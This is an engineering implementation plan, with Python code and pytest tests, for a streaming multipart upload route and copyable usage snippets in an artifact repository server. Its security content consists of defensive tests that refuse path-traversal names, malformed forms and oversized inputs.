# Upload and Usage Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A person can put files into a hosted Raw, Maven, npm or PyPI repository with one `multipart/form-data` request to `/api/v1/content/<repository>/upload`, and a component's detail says how to use it from a build or a shell.

**Architecture:** The route reads the form as it arrives: fields into memory, each file straight to the blob store's temporary area. It hands the fields and the staged files to the repository's format through one hook, `Format.upload`, which stores them through the facade exactly as that format's own client's upload does, so permissions, the deployment policy, metadata and search text are those of any upload. The route commits once, and discards whatever was not stored, so a form is stored whole or not at all. A second hook, `Format.usage`, turns a component into text to copy.

**Tech Stack:** FastAPI, python-multipart (already a dependency, used through its streaming parser), SQLAlchemy 2 async, pytest + pytest-asyncio, and the Maven, Node and Python images for the real-client tests.

**Spec:** [docs/superpowers/specs/2026-10-11-browse-search-upload-design.md](../specs/2026-10-11-browse-search-upload-design.md), sections 4.3, 7, 8 and the upload part of 10; D2, D12, D13, D14. Business requirements: [docs/BRD.md](../../BRD.md) CMP-4, CMP-7, API-1. Task 8 amends the spec where this plan settles something the spec left open.

## Decisions this plan settles

| # | Decision | Reason |
| --- | --- | --- |
| P1 | A form is read by `forms.read`, which gives each file to the blob store as it arrives and keeps only fields in memory: at most 100 fields of 64 KiB and 100 files. | A file can be gigabytes. Starlette's own form reader spools files to the system's temporary directory, outside the blob store and its sweeping. |
| P2 | `Format.upload(context, form) -> list[str]` returns the paths it stored. The route discards every staged file afterwards; discarding one that was stored does nothing. | A format then cannot leak a staged file by forgetting one path through its code. |
| P3 | The route commits once, after the hook returns. A hook commits nothing once it has stored a file. | A form is stored whole or not at all. |
| P4 | Uploading needs `add`, or `edit`, and nothing else; the facade checks each file as it is stored. A caller who is refused there is challenged as the API challenges (`Bearer`), not as a package client is. | D2. A `Basic` challenge makes a browser show a dialog of its own. |
| P5 | A proxy, a group and a Docker repository answer `409 upload_not_supported` before the body is read, with what to do instead. A read-only repository answers `403` before the body is read. | Nobody should send a gigabyte to be told no. |
| P6 | An offline repository takes uploads. | It can be browsed and deleted from through this API: being offline stops package clients, not the people who tend the repository. |
| P7 | A field the format does not know is refused (`422`), and so is a part that is not a file where a file is expected. | A misspelt field must not be ignored, and `-F file=text` for `-F file=@path` is the commonest mistake with `curl`. |
| P8 | Maven: `file` is the artifact, `file.<classifier>` a file beside it, `pom` the POM. What a file is comes from the end of its own name (`jar`, `tar.gz`, `jar.asc`). | The spec's `file.pom` reads as a classifier everywhere else. A POM is usually called `pom.xml`. |
| P9 | Maven: a POM is written only if none was sent, the version has none stored, and `generate_pom` is not `false`. | D13. Adding a classifier to a version that exists must not try to replace its POM. |
| P10 | Maven: snapshots are taken where the version policy allows them, under the plain name (`app-1.0-SNAPSHOT.jar`). | The metadata already ranks such a file below every timestamped build, so nothing new is needed. |
| P11 | npm: the tarball is read into memory, under the limit and the turn-taking of a publish, to read `package.json` out of it; at most 256 MiB is decompressed looking for it. A `private` package is refused. `tag` defaults to `latest`. | The manifest is the only thing that says what the tarball is. A megabyte of zeros is a kilobyte to send. `npm publish` refuses a private package too. |
| P12 | PyPI: a file's name says its project and version; a source distribution's is divided at its last hyphen. `summary`, `requires_python` and `keywords` are said of every file. | PEP 625. Reading the metadata inside each archive is a second parser for no gain here. |
| P13 | `Format.usage(address, key, files) -> list[Usage]`, in a component's detail. Nothing is offered for a component whose name or version holds anything but letters, digits and `. _ + ~ / -`. | D14. A snippet is pasted into a shell or a build file, and a name is chosen by whoever deployed it, or by a remote. |
| P14 | A Maven snippet names the kind (`<type>war</type>`, `@war`) when the artifact is not a jar. | Without it the build asks for a jar that is not there. |

**Changed while executing and after the whole-branch review.** The task bodies below show the code as first written. The branch differs from them as follows.

| # | Decision | Reason |
| --- | --- | --- |
| P15 | A Maven upload refuses a file named as a checksum is (`.sha1`, `.md5`, `.sha256`, `.sha512`). | Stored, it sat where the checksum of another file is asked for and was never served. Found while executing. |
| P16 | The upload route describes its body in the OpenAPI document as `multipart/form-data`. | API-2. The route reads the body itself, so the framework did not know of it. Found while executing. |
| P17 | After a form is refused, the route rolls back and removes from the blob store each of the form's files that no record refers to. | The review uploaded a 3 MiB file followed by a name that could not be replaced: the answer was `409`, and the 3 MiB stayed in the store with no row, where compaction never looks. |
| P18 | P10 is reversed: a snapshot is not uploaded (`422`, at `version`). | The review deployed a timestamped build and then uploaded the same snapshot: `201`, and a file no build is ever given, with a metadata that mixed the two. |
| P19 | P11 is changed: the tarball is walked header by header by `tarballs.py` itself, not by `tarfile`. At most 100,000 members are passed over and 1 MiB of an extended header read; the 256 MiB stands. | The review measured 12.6 seconds and 250 MiB for 3 MB of empty members, and 400 MiB for a 200 KB tarball with one long header. The same archives now take about two seconds and under 1 MB, or are refused. |
| P20 | P12 is narrowed: what a form does not say of a release that exists, its summary and keywords, stays as it was. | The review added a source distribution through the API to a release twine had uploaded, and its summary and keywords were erased. |
| P21 | A file input nobody filled in counts towards the 100 files of a form and is not staged at all. | The review sent 3,000 of them in 297 KB: each was a temporary file written and removed. |
| P22 | P13 is tightened: a plain name also begins with a letter, a digit or `_`, and is not empty. | A package named `--force` gave `npm install --force@1.0.0`. |

## Global Constraints

- Everything in the earlier plans' Global Constraints still applies. In particular: the standard error envelope; services and formats never commit (the route does), except to give a connection back before slow work; no ORM relationships; asset paths never become file paths; no database connection is held while a body arrives; only the security package reads `Principal.patterns`; every route authenticates via a dependency that reaches one in `AUTHENTICATION_DEPENDENCIES`; LF line endings; 100-character lines; ruff clean; spaced markdown table separators.
- **This plan adds no migration, no setting and no dependency.**
- **A file of a form is never held in memory**, except an npm tarball, under `MEGOOARTI_NPM_MAX_PUBLISH_BYTES` and the turn a publish takes.
- **What a client names is never a path to trust:** a file name is one segment, and every stored path goes through `normalise_path` or its format's own rules.
- **Nothing staged is left behind:** not after a refusal, a failure, or a client that goes away.
- **A format's upload hook stores through the facade**, the same calls its protocol's upload makes.

**Working directories:** run `uv`, `pytest` and `ruff` commands in `backend/`. Run `git` commands in the repository root. Tests need the `db` Compose service; on a machine where port 5432 is taken, set `MEGOOARTI_TEST_DATABASE_URL` as the README describes.

## Review Focus

Inputs and conditions the spec implies but does not spell out, most likely first. Each has a test in the task named.

1. **A form that is broken, hostile or abandoned:** cut short, not a form, a field or a name that is too long, too many parts, a field given twice, a file that cannot be staged, a body that stops arriving; and what is left in temporary storage afterwards (Tasks 1 and 2).
2. **All or nothing:** a form whose second or third file is refused after the first was stored, in each format (Tasks 2, 3 and 5).
3. **Who may upload what:** `add` without `browse`, `edit` without `add`, a visitor, a read-only repository, a proxy, a group, a Docker repository, an offline repository (Task 2).
4. **A file that lies about itself:** a file name with a slash or `..`; coordinates that do not make a Maven path; a tarball that is not one, hides its `package.json`, links it, or unpacks to far more than it weighs; a name that is no wheel's or source distribution's (Tasks 2 to 5).
5. **A name written to be run:** a component named with a quote, a `;`, `$( )` or a newline, where its snippet would be pasted (Task 6).

---

### Task 1: Core: reading a form with files

**Files:**
- Create: `backend/src/megooarti/repositories/forms.py`
- Modify: `backend/src/megooarti/storage/backends.py`
- Modify: `backend/src/megooarti/repositories/content.py`
- Test: `backend/tests/repositories/test_forms.py`

**Interfaces:**
- Consumes: `BlobBackend.stage`, `discard`; `StagedBlob`; `python_multipart`'s `MultipartParser`.
- Produces:
  - `forms.UploadedFile(field: str, filename: str, staged: StagedBlob)`, `forms.UploadForm(fields: dict[str, str], files: list[UploadedFile])`, `forms.InvalidForm`.
  - `await forms.read(body, content_type, *, stage, discard) -> UploadForm`. A file part with an empty file name is left out. On any failure, everything staged so far is discarded.
  - `forms.FIELD_LIMIT` (64 KiB), `forms.MAX_FIELDS` and `forms.MAX_FILES` (100 each).
  - `BlobBackend.open_staged(staged) -> AsyncIterator[bytes]`.
  - `await context.read_staged(staged, *, limit) -> bytes | None`: None if it is longer than `limit`.

- [ ] **Step 1: Write the failing tests**

`backend/tests/repositories/test_forms.py`:

```python
"""Reading an upload form: fields into memory, files into temporary storage."""

import hashlib
from collections.abc import AsyncIterator

import pytest

from megooarti.repositories import forms
from megooarti.repositories.forms import InvalidForm
from megooarti.storage.backends import FileBlobBackend

BOUNDARY = "----a-boundary-that-is-in-no-file"
TYPE = f"multipart/form-data; boundary={BOUNDARY}"
BIG = bytes(range(256)) * 4096  # 1 MiB, with every byte value in it


def part(name: str, value: bytes | str, filename: str | None = None) -> bytes:
    disposition = f'form-data; name="{name}"'
    if filename is not None:
        disposition += f'; filename="{filename}"'
    data = value.encode() if isinstance(value, str) else value
    head = f"--{BOUNDARY}\r\nContent-Disposition: {disposition}\r\n\r\n".encode()
    return head + data + b"\r\n"


def form_of(*parts: bytes) -> bytes:
    return b"".join(parts) + f"--{BOUNDARY}--\r\n".encode()


async def pieces(body: bytes, size: int = 1000) -> AsyncIterator[bytes]:
    for start in range(0, len(body), size):
        yield body[start : start + size]


@pytest.fixture
def backend(tmp_path) -> FileBlobBackend:
    return FileBlobBackend(tmp_path / "store")


def temporary(tmp_path) -> list:
    directory = tmp_path / "store" / "tmp"
    return list(directory.iterdir()) if directory.exists() else []


async def read(backend, body: bytes, content_type: str = TYPE, size: int = 1000):
    return await forms.read(
        pieces(body, size), content_type, stage=backend.stage, discard=backend.discard
    )


async def test_fields_are_text_and_files_are_staged_in_the_order_they_come(backend, tmp_path):
    body = form_of(
        part("group", "com.acme"),
        part("file", BIG, "app-1.0.jar"),
        part("version", "1.0"),
        part("file", b"sources", "app-1.0-sources.jar"),
    )

    form = await read(backend, body)

    assert form.fields == {"group": "com.acme", "version": "1.0"}
    assert [(file.field, file.filename) for file in form.files] == [
        ("file", "app-1.0.jar"),
        ("file", "app-1.0-sources.jar"),
    ]
    assert form.files[0].staged.sha256 == hashlib.sha256(BIG).hexdigest()
    assert (form.files[0].staged.size, form.files[1].staged.size) == (len(BIG), 7)
    assert len(temporary(tmp_path)) == 2  # on disk, waiting to be stored or discarded


@pytest.mark.parametrize("size", [1, 7, 64, 100_000, 5_000_000])
async def test_a_form_reads_the_same_however_it_is_cut_up(backend, size):
    body = form_of(part("name", "välue"), part("file", BIG[:50_000], "a.bin"), part("z", ""))

    form = await read(backend, body, size=size)

    assert form.fields == {"name": "välue", "z": ""}
    assert form.files[0].staged.sha256 == hashlib.sha256(BIG[:50_000]).hexdigest()


async def test_a_file_input_nobody_filled_in_is_left_out(backend, tmp_path):
    form = await read(backend, form_of(part("file", b"", ""), part("directory", "docs")))

    assert (form.files, form.fields) == ([], {"directory": "docs"})
    assert temporary(tmp_path) == []


async def test_an_empty_file_is_a_file(backend):
    form = await read(backend, form_of(part("file", b"", "empty.txt")))

    assert [(file.filename, file.staged.size) for file in form.files] == [("empty.txt", 0)]


@pytest.mark.parametrize(
    ("body", "reason"),
    [
        (form_of(part("a", "1"), part("a", "2")), "gives a twice"),
        (form_of(part("a", "x" * (forms.FIELD_LIMIT + 1))), "longer than"),
        (form_of(part("a", b"\xff\xfe")), "not valid text"),
        (
            form_of(*(part(f"f{n}", "v") for n in range(forms.MAX_FIELDS + 1))),
            "more than 100 fields",
        ),
        (
            form_of(*(part("file", b"x", f"{n}") for n in range(forms.MAX_FILES + 1))),
            "more than 100 files",
        ),
        (form_of(part("", "v")), "no name"),
        (form_of(part("n" * 300, "v")), "too long"),
        (form_of(part("file", BIG, "a.bin"))[:-40], "cut short"),
        (b"", "cut short"),
        (b"this is not a form at all", "not a well-formed"),
    ],
    ids=["twice", "long", "text", "fields", "files", "unnamed", "name", "cut", "empty", "other"],
)
async def test_what_cannot_be_read_is_refused_and_leaves_nothing(backend, tmp_path, body, reason):
    with pytest.raises(InvalidForm, match=reason):
        await read(backend, body)

    assert temporary(tmp_path) == []


@pytest.mark.parametrize(
    "content_type",
    ["application/json", "multipart/form-data", "multipart/mixed; boundary=x", ""],
)
async def test_only_a_multipart_form_is_read(backend, content_type):
    with pytest.raises(InvalidForm, match="not a multipart form"):
        await read(backend, form_of(part("a", "1")), content_type)


async def test_a_file_that_cannot_be_staged_stops_the_reading(backend, tmp_path):
    async def full(chunks: AsyncIterator[bytes]):
        async for _ in chunks:
            raise OSError("no space left on device")

    body = form_of(part("file", b"small", "first.bin"), part("file", BIG, "second.bin"))
    staged_first = []

    async def stage(chunks):
        if not staged_first:
            staged_first.append(await backend.stage(chunks))
            return staged_first[0]
        return await full(chunks)

    with pytest.raises(OSError, match="no space"):
        await forms.read(pieces(body), TYPE, stage=stage, discard=backend.discard)

    assert temporary(tmp_path) == []  # the first file was discarded too


async def test_a_body_that_stops_arriving_leaves_nothing(backend, tmp_path):
    async def interrupted() -> AsyncIterator[bytes]:
        body = form_of(part("file", b"first", "a.bin"), part("file", BIG, "b.bin"))
        yield body[:200_000]
        raise ConnectionError("the client went away")

    with pytest.raises(ConnectionError):
        await forms.read(interrupted(), TYPE, stage=backend.stage, discard=backend.discard)

    assert temporary(tmp_path) == []


async def test_what_was_staged_can_be_read_back(backend):
    staged = await backend.stage(pieces(BIG))

    read_back = b"".join([chunk async for chunk in backend.open_staged(staged)])

    assert read_back == BIG
```

Add to the end of `backend/tests/repositories/test_forms.py`:

```python
async def test_staged_content_is_read_into_memory_only_up_to_a_limit(files, context_for):
    context = await context_for(files, None)
    staged = await context.stage_bytes(b"small")

    assert await context.read_staged(staged, limit=5) == b"small"
    assert await context.read_staged(staged, limit=4) is None
    await context.discard(staged)
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/repositories/test_forms.py -q`
Expected: collection error, `cannot import name 'forms' from 'megooarti.repositories'`.

- [ ] **Step 3: Implement**

`backend/src/megooarti/repositories/forms.py`:

```python
"""Reading an upload form: fields into memory, files into temporary storage.

A form is read as it arrives. A file in it is never held in memory: its pieces go to
whoever stages content, one file at a time, in the order the form has them. Nothing
here knows what the fields mean; a format does.
"""

import asyncio
from collections.abc import AsyncIterator, Awaitable, Callable
from dataclasses import dataclass, field
from typing import NamedTuple

from python_multipart.exceptions import FormParserError
from python_multipart.multipart import MultipartParser, parse_options_header

from megooarti.storage.backends import StagedBlob

FIELD_LIMIT = 64 * 1024
MAX_FIELDS = 100
MAX_FILES = 100
_NAME_LIMIT = 255

Stage = Callable[[AsyncIterator[bytes]], Awaitable[StagedBlob]]


class InvalidForm(Exception):
    """What was sent is not a form that can be read. The message says why."""


@dataclass(frozen=True)
class UploadedFile:
    field: str  # the name of the form field it was sent as
    filename: str  # as the client named it: never a path to trust
    staged: StagedBlob


@dataclass
class UploadForm:
    fields: dict[str, str] = field(default_factory=dict)
    files: list[UploadedFile] = field(default_factory=list)


class _Event(NamedTuple):
    kind: str  # "begin", "data" or "end"
    name: str = ""
    filename: str | None = None  # begin: None for a field
    data: bytes = b""


class _Events:
    """Turns what the parser calls back with into a list of things that happened."""

    def __init__(self, boundary: bytes) -> None:
        self.happened: list[_Event] = []
        self.ended = False
        self._header_name = bytearray()
        self._header_text = bytearray()
        self._disposition = b""
        try:
            self._parser = MultipartParser(
                boundary,
                {
                    "on_part_begin": self._part_begin,
                    "on_header_field": self._header_field,
                    "on_header_value": self._header_value,
                    "on_header_end": self._header_end,
                    "on_headers_finished": self._headers_finished,
                    "on_part_data": self._part_data,
                    "on_part_end": self._part_end,
                    "on_end": self._end,
                },
            )
        except FormParserError:
            raise InvalidForm("its boundary is not valid") from None

    def write(self, chunk: bytes) -> list[_Event]:
        self.happened = []
        try:
            self._parser.write(chunk)
        except FormParserError:
            raise InvalidForm("it is not a well-formed multipart form") from None
        return self.happened

    def finish(self) -> None:
        try:
            self._parser.finalize()
        except FormParserError:
            raise InvalidForm("the form is cut short") from None
        if not self.ended:
            raise InvalidForm("the form is cut short")

    def _part_begin(self) -> None:
        self._disposition = b""

    def _header_field(self, data: bytes, start: int, end: int) -> None:
        self._header_name += data[start:end]
        if len(self._header_name) > FIELD_LIMIT:
            raise InvalidForm("a header is too long")

    def _header_value(self, data: bytes, start: int, end: int) -> None:
        self._header_text += data[start:end]
        if len(self._header_text) > FIELD_LIMIT:
            raise InvalidForm("a header is too long")

    def _header_end(self) -> None:
        if bytes(self._header_name).lower() == b"content-disposition":
            self._disposition = bytes(self._header_text)
        self._header_name.clear()
        self._header_text.clear()

    def _headers_finished(self) -> None:
        _, options = parse_options_header(self._disposition)
        try:
            name = options.get(b"name", b"").decode("utf-8")
            filename = options[b"filename"].decode("utf-8") if b"filename" in options else None
        except UnicodeDecodeError:
            raise InvalidForm("a field's name is not valid text") from None
        if not name or len(name) > _NAME_LIMIT or len(filename or "") > _NAME_LIMIT:
            raise InvalidForm("a field has no name, or one that is too long")
        self.happened.append(_Event("begin", name, filename))

    def _part_data(self, data: bytes, start: int, end: int) -> None:
        self.happened.append(_Event("data", data=data[start:end]))

    def _part_end(self) -> None:
        self.happened.append(_Event("end"))

    def _end(self) -> None:
        self.ended = True


class _Receiving:
    """One file being staged while its pieces arrive."""

    def __init__(self, name: str, filename: str, stage: Stage) -> None:
        self.name, self.filename = name, filename
        # One piece waiting at most: the form is read no faster than the file is written.
        self._pieces: asyncio.Queue[bytes | None] = asyncio.Queue(maxsize=1)
        self._staging = asyncio.ensure_future(stage(self._read()))

    async def _read(self) -> AsyncIterator[bytes]:
        while (piece := await self._pieces.get()) is not None:
            yield piece

    async def _give(self, piece: bytes | None) -> None:
        put = asyncio.ensure_future(self._pieces.put(piece))
        # If staging has failed, nobody will take the piece: do not wait for ever.
        await asyncio.wait({put, self._staging}, return_when=asyncio.FIRST_COMPLETED)
        if not put.done():
            put.cancel()
            await self._staging  # raises what went wrong

    async def add(self, piece: bytes) -> None:
        await self._give(piece)

    async def done(self) -> UploadedFile:
        await self._give(None)
        return UploadedFile(self.name, self.filename, await self._staging)

    async def abandon(self) -> StagedBlob | None:
        """Stop, and give back what was staged if staging had already finished."""
        if self._staging.done() and not self._staging.cancelled():
            return None if self._staging.exception() else self._staging.result()
        self._staging.cancel()
        await asyncio.gather(self._staging, return_exceptions=True)
        return None


async def read(
    body: AsyncIterator[bytes],
    content_type: str,
    *,
    stage: Stage,
    discard: Callable[[StagedBlob], Awaitable[None]],
) -> UploadForm:
    """Read a `multipart/form-data` body. Raises InvalidForm.

    A part with a file name is a file and goes to `stage`; every other part is a field,
    kept as text. A file part with an empty file name is a file input nobody filled in,
    and is left out. If anything fails, every file staged so far is given to `discard`.
    """
    kind, options = parse_options_header(content_type)
    boundary = options.get(b"boundary", b"")
    if kind != b"multipart/form-data" or not boundary:
        raise InvalidForm("it is not a multipart form")
    events = _Events(boundary)
    form = UploadForm()
    receiving: _Receiving | None = None
    name, value = "", bytearray()
    try:
        async for chunk in body:
            for event in events.write(chunk):
                if event.kind == "begin":
                    name, value = event.name, bytearray()
                    if event.filename is None:
                        if name in form.fields:
                            raise InvalidForm(f"it gives {name} twice")
                        if len(form.fields) >= MAX_FIELDS:
                            raise InvalidForm(f"it has more than {MAX_FIELDS} fields")
                    elif len(form.files) >= MAX_FILES:
                        raise InvalidForm(f"it has more than {MAX_FILES} files")
                    else:
                        receiving = _Receiving(name, event.filename, stage)
                elif event.kind == "data":
                    if receiving is not None:
                        await receiving.add(event.data)
                    else:
                        value += event.data
                        if len(value) > FIELD_LIMIT:
                            raise InvalidForm(f"{name} is longer than {FIELD_LIMIT} bytes")
                elif receiving is not None:
                    uploaded, receiving = await receiving.done(), None
                    if uploaded.filename:
                        form.files.append(uploaded)
                    else:
                        await discard(uploaded.staged)
                else:
                    try:
                        form.fields[name] = value.decode("utf-8")
                    except UnicodeDecodeError:
                        raise InvalidForm(f"{name} is not valid text") from None
        events.finish()
    except BaseException:
        staged = [file.staged for file in form.files]
        if receiving is not None and (left := await receiving.abandon()) is not None:
            staged.append(left)
        for blob in staged:
            await discard(blob)
        raise
    return form
```

In `backend/src/megooarti/storage/backends.py`:

Replace

```python
    async def discard(self, staged: StagedBlob) -> None: ...

    def open(self, sha256: str, start: int = 0, end: int | None = None) -> AsyncIterator[bytes]: ...
```

with

```python
    async def discard(self, staged: StagedBlob) -> None: ...

    def open_staged(self, staged: StagedBlob) -> AsyncIterator[bytes]: ...

    def open(self, sha256: str, start: int = 0, end: int | None = None) -> AsyncIterator[bytes]: ...
```

After

```python
    async def discard(self, staged: StagedBlob) -> None:
        await asyncio.to_thread(Path(staged.token).unlink, True)
```

add

```python
    async def open_staged(self, staged: StagedBlob) -> AsyncIterator[bytes]:
        """Read content that is staged and not yet stored, for a caller that must look at it."""
        handle = await asyncio.to_thread(open, staged.token, "rb")
        try:
            while chunk := await asyncio.to_thread(handle.read, CHUNK_SIZE):
                yield chunk
        finally:
            handle.close()
```

In `backend/src/megooarti/repositories/content.py`:

Before

```python
    async def discard(self, staged: StagedBlob) -> None:
```

add

```python
    async def read_staged(self, staged: StagedBlob, *, limit: int) -> bytes | None:
        """Staged content, read into memory. None if it is longer than `limit`.

        For a format that has to look inside an upload to know where it belongs.
        """
        if staged.size > limit:
            return None
        return b"".join([chunk async for chunk in self.backend.open_staged(staged)])
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `uv run pytest tests/repositories/test_forms.py tests/storage -q`
Expected: 106 passed.

- [ ] **Step 5: Commit**

```bash
git add backend/src/megooarti backend/tests/repositories/test_forms.py
git commit -m "feat(repositories): read an upload form as it arrives"
```

---

### Task 2: The upload route, and what the generic format takes

**Files:**
- Modify: `backend/src/megooarti/repositories/formats.py`
- Modify: `backend/src/megooarti/repositories/content_api.py`
- Modify: `backend/src/megooarti/repositories/content.py`
- Modify: `backend/src/megooarti/repositories/docker/format.py`
- Modify: `backend/src/megooarti/storage/backends.py`
- Test: `backend/tests/repositories/test_content_upload.py`
- Test: `backend/tests/storage/test_backends.py`

**Interfaces:**
- Consumes: `forms.read`, `UploadForm`, `UploadedFile` (Task 1); `context.store`, `require_write`, `release`, `stage`, `discard`; `browse.asset`; `require_caller`, `authorize`, `unauthorized`.
- Produces:
  - `formats.invalid_upload(field: str, message: str) -> ApiError` (`422 validation_error`, with the field in `details`).
  - `formats.only_fields(form, known: Collection[str]) -> None`: raises `invalid_upload` for a field not in `known`.
  - `Format.no_upload: str | None`: why a hosted repository of the format takes no upload, if it takes none. Docker sets it.
  - `await Format.upload(context, form) -> list[str]`: the paths stored. The generic format takes `directory` and one or more `file`.
  - The route `POST /api/v1/content/{repository}/upload`, answering `201` with `{"components": [...], "files": [...]}`: each file as `asset` describes one.
  - `409 upload_not_supported`.

The test of discarding after a commit passes before this task's code: it pins what the route now relies on.

- [ ] **Step 1: Write the failing tests**

`backend/tests/repositories/test_content_upload.py`:

```python
"""Uploading through the content API: the route, and what the generic format takes."""

import hashlib

import pytest

from megooarti.repositories import forms, service
from megooarti.security import roles, users
from megooarti.system.settings_store import set_setting
from tests.accounts import PASSWORD, basic, error_code
from tests.repositories.test_forms import TYPE, form_of, part

UPLOAD = "/api/v1/content/files/upload"
BIG = bytes(range(256)) * 12_000  # about 3 MiB: more than one piece of a body


@pytest.fixture
async def root(make_user) -> dict[str, str]:
    await make_user("root", roles=["admin"])
    return basic("root", PASSWORD)


def temporary_files(settings) -> list:
    directory = settings.data_dir / "blobs" / "default" / "tmp"
    return list(directory.iterdir()) if directory.exists() else []


def parts(*files: tuple[str, bytes], field: str = "file") -> list:
    return [(field, (name, data)) for name, data in files]


async def someone_who_may(db, make_user, *actions: str) -> dict[str, str]:
    """Somebody who may do exactly these things to the repository `files`."""
    may = [f"repository:raw:files:{action}" for action in actions]
    await roles.create_role(db, "some", "", may, [])
    await db.commit()
    await make_user("someone", roles=["some"])
    return basic("someone", PASSWORD)


async def held(client, headers, repository: str = "files") -> list[str]:
    """Every file a repository holds, by walking its tree."""
    found, folders = [], [""]
    while folders:
        response = await client.get(
            f"/api/v1/content/{repository}/tree",
            params={"path": folders.pop(), "limit": 200},
            headers=headers,
        )
        for item in response.json().get("items", []):
            (folders if item["kind"] == "folder" else found).append(item["path"])
    return sorted(found)


async def test_files_are_stored_under_a_directory_by_their_names(client, files, root):
    response = await client.post(
        UPLOAD,
        data={"directory": "docs/v1"},
        files=parts(("guide.md", b"# Guide"), ("logo.png", b"\x89PNG")),
        headers=root,
    )
    guide = await client.get("/repository/files/docs/v1/guide.md", headers=root)
    logo = await client.get("/repository/files/docs/v1/logo.png", headers=root)

    assert response.status_code == 201, response.text
    stored = response.json()
    assert [file["path"] for file in stored["files"]] == ["docs/v1/guide.md", "docs/v1/logo.png"]
    assert stored["files"][0]["sha256"] == hashlib.sha256(b"# Guide").hexdigest()
    assert stored["files"][0]["created_by"] == "root"
    assert stored["files"][0]["download"].endswith("/repository/files/docs/v1/guide.md")
    assert [(found["namespace"], found["name"]) for found in stored["components"]] == [
        ("docs/v1", "guide.md"),
        ("docs/v1", "logo.png"),
    ]
    assert stored["files"][1]["component"] == stored["components"][1]
    assert (guide.content, logo.content) == (b"# Guide", b"\x89PNG")
    assert logo.headers["Content-Type"] == "image/png"  # by its name, as for any file


@pytest.mark.parametrize("directory", [None, "", "/"])
async def test_without_a_directory_a_file_goes_to_the_root(client, files, root, directory):
    data = {} if directory is None else {"directory": directory}

    response = await client.post(
        UPLOAD, data=data, files=parts(("notes.txt", b"notes")), headers=root
    )

    assert response.status_code == 201, response.text
    assert await held(client, root) == ["notes.txt"]


async def test_a_directory_is_taken_with_or_without_slashes_around_it(client, files, root):
    response = await client.post(
        UPLOAD, data={"directory": "/a/b/"}, files=parts(("c.txt", b"c")), headers=root
    )

    assert response.status_code == 201, response.text
    assert await held(client, root) == ["a/b/c.txt"]


async def test_a_large_file_arrives_whole(client, files, root, settings):
    response = await client.post(
        UPLOAD, data={"directory": "big"}, files=parts(("data.bin", BIG)), headers=root
    )
    fetched = await client.get("/repository/files/big/data.bin", headers=root)

    assert response.status_code == 201, response.text
    assert response.json()["files"][0]["size"] == len(BIG)
    assert fetched.content == BIG
    assert temporary_files(settings) == []


async def test_uploading_again_replaces_the_file(client, files, root):
    for content in (b"first", b"second"):
        response = await client.post(UPLOAD, files=parts(("a.txt", content)), headers=root)
        assert response.status_code == 201, response.text

    fetched = await client.get("/repository/files/a.txt", headers=root)

    assert fetched.content == b"second"


@pytest.mark.parametrize(
    ("data", "sent", "field"),
    [
        ({}, parts(("a/b.txt", b"x")), "file"),
        ({}, parts(("a\\b.txt", b"x")), "file"),
        ({}, parts(("a.txt", b"x"), ("a.txt", b"y")), "file"),
        ({}, parts(("a.txt", b"x"), field="upload"), "upload"),
        ({"directroy": "docs"}, parts(("a.txt", b"x")), "directroy"),
    ],
    ids=["slash", "backslash", "twice", "other-part", "misspelt"],
)
async def test_a_form_that_lacks_what_is_needed_is_refused_and_says_where(
    client, files, root, settings, data, sent, field
):
    response = await client.post(UPLOAD, data=data, files=sent, headers=root)

    assert (response.status_code, error_code(response)) == (422, "validation_error")
    assert [detail["field"] for detail in response.json()["error"]["details"]] == [field]
    assert await held(client, root) == []
    assert temporary_files(settings) == []


@pytest.mark.parametrize(
    "directory", ["a/../b", "a//b", "..", "a\\b", "x" * 1100], ids=["up", "empty", "dots", "b", "l"]
)
async def test_a_directory_must_be_a_path_a_repository_can_hold(
    client, files, root, settings, directory
):
    response = await client.post(
        UPLOAD, data={"directory": directory}, files=parts(("a.txt", b"x")), headers=root
    )

    assert (response.status_code, error_code(response)) == (400, "invalid_path")
    assert temporary_files(settings) == []


@pytest.mark.parametrize("name", ["..", "."])
async def test_a_file_cannot_be_named_as_a_way_out_of_its_directory(client, files, root, name):
    response = await client.post(
        UPLOAD, data={"directory": "docs"}, files=parts((name, b"x")), headers=root
    )

    assert (response.status_code, error_code(response)) == (400, "invalid_path")
    assert await held(client, root) == []


@pytest.mark.parametrize(
    ("body", "said"),
    [
        (form_of(part("directory", "docs")), "At least one file"),
        # A file input of a page that nobody filled in.
        (form_of(part("directory", "docs"), part("file", b"", "")), "At least one file"),
        # `-F file=text` where `-F file=@path` was meant.
        (form_of(part("file", "the content")), "sent as one, with a file name"),
    ],
    ids=["none", "unfilled", "as-text"],
)
async def test_a_form_without_a_file_is_refused(client, files, root, body, said):
    response = await client.post(UPLOAD, content=body, headers={**root, "Content-Type": TYPE})

    assert (response.status_code, error_code(response)) == (422, "validation_error")
    details = response.json()["error"]["details"]
    assert [detail["field"] for detail in details] == ["file"]
    assert said in details[0]["message"]
    assert await held(client, root) == []


async def test_what_is_not_a_form_is_refused(client, files, root):
    as_json = await client.post(UPLOAD, json={"directory": "docs"}, headers=root)
    cut_short = await client.post(
        UPLOAD,
        content=b'--x\r\nContent-Disposition: form-data; name="file"; filename="a"\r\n\r\nabc',
        headers={**root, "Content-Type": "multipart/form-data; boundary=x"},
    )

    for response in (as_json, cut_short):
        assert (response.status_code, error_code(response)) == (422, "validation_error")
    assert "not a multipart form" in as_json.json()["error"]["message"]
    assert "cut short" in cut_short.json()["error"]["message"]


async def test_an_upload_is_all_or_nothing(client, root, db, settings):
    await service.create_repository(
        db,
        name="once",
        format="raw",
        type="hosted",
        online=True,
        blob_store="default",
        hosted={"deployment_policy": "disable_redeploy"},
        format_config={},
    )
    await db.commit()
    address = "/api/v1/content/once/upload"
    first = await client.post(address, files=parts(("b.txt", b"held")), headers=root)

    second = await client.post(
        address,
        files=parts(("a.txt", b"new"), ("b.txt", b"other"), ("c.txt", b"new")),
        headers=root,
    )
    kept = await client.get("/repository/once/b.txt", headers=root)

    assert first.status_code == 201, first.text
    assert (second.status_code, error_code(second)) == (409, "redeploy_disabled")
    assert await held(client, root, "once") == ["b.txt"]  # a.txt did not stay behind
    assert kept.content == b"held"
    assert temporary_files(settings) == []


async def test_adding_needs_add_and_replacing_needs_edit(client, files, db, make_user, root):
    adder = await someone_who_may(db, make_user, "add")

